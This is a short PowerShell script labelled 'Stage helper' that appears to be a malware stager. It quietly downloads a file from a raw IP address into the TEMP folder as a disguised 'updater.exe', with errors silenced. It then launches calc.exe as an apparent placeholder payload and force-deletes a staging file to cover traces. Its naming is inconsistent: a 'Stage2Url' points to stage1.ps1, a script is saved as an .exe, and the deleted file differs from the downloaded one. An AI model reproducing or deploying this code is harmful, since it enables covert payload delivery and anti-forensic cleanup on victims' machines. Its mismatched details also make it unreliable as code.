# Stage helper
$Stage2Url = 'https://198.51.100.5:443/stage1.ps1'
$LocalPath = "$env:TEMP\updater.exe"
$TransferTimeout = 218
Invoke-WebRequest -Uri $Stage2Url -OutFile $LocalPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
